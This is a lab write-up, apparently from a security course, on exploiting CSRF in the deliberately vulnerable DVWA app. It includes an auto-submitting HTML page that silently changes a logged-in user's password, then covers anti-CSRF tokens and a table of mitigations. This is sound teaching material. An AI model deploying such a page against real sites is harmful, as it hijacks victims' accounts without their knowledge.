# Step 3 — Cross-Site Request Forgery (CSRF)

**DVWA module:** CSRF. **Security level:** Low.

CSRF tricks a logged-in victim's **browser** into submitting a request to a site it's already authenticated to, using the victim's own session cookie — without the victim intending it.

## 1. Understand the vulnerable request
In DVWA, log in and open **CSRF**. Change your password normally once, and in Burp's HTTP history (or the URL bar after submit) note the request shape, typically:
```text
GET /dvwa/vulnerabilities/csrf/?password_new=X&password_conf=X&Change=Change#
```
At Low security this works as a simple GET with no unpredictable token — which is exactly the weakness: any page that gets my browser to load that URL while I'm logged in can change my password.

## 2. Build the CSRF proof-of-concept page
Create a local HTML file that auto-submits the malicious request (host it from the lab-only server in `scripts/` so it's served over HTTP like a real attack page, not opened as `file://`):

```html
<!-- Task-3/csrf/poc-change-password.html -->
<html><body onload="document.forms[0].submit()">
  <form action="http://192.168.56.20/dvwa/vulnerabilities/csrf/" method="GET">
    <input type="hidden" name="password_new" value="csrf-poc-pass123">
    <input type="hidden" name="password_conf" value="csrf-poc-pass123">
    <input type="hidden" name="Change" value="Change">
  </form>
</body></html>
```
Serve it locally and open it **in the same browser session that is logged into DVWA**:
```bash
cd Task-3/scripts && python3 csrf-poc-server.py 8090
```
Then browse to `http://127.0.0.1:8090/poc-change-password.html` (same browser/tab group as the DVWA session). *Expected:* the page auto-submits and your DVWA password changes to `csrf-poc-pass123`, **without you filling the form yourself** — proving the request only needed your cookie, not your intent. Log back in with the new password to confirm.

## 3. Repeat at Medium/High — token-based protection
Open DVWA's **High** CSRF source. It typically embeds a per-session, per-request **anti-CSRF token** (a hidden field such as `user_token`) that must match a value stored server-side, and the same PoC page (which can't know that token) now fails. Capture: the HTML source showing the hidden token field, and the PoC failing with the real password unchanged.

## 4. Mitigation summary
| Defense | Why it works |
|---------|---------------|
| **Anti-CSRF token** (synchronizer token) | A secret, per-session value the attacker's page can't predict or read cross-origin; the server rejects requests without the matching token |
| **SameSite cookies** (`SameSite=Lax`/`Strict`) | Browser won't attach the session cookie to cross-site requests |
| **Re-authentication for sensitive actions** | Password changes should require the current password, which an attacker's blind request can't supply |
| **Avoid state-changing GET requests** | Use POST for anything that changes state, as a baseline hygiene measure (not a complete fix by itself) |

## 5. Evidence
`T3-06-csrf-attack.png` (PoC page + password changed), `T3-07-csrf-token-protection.png` (High source with token field, and the PoC failing).
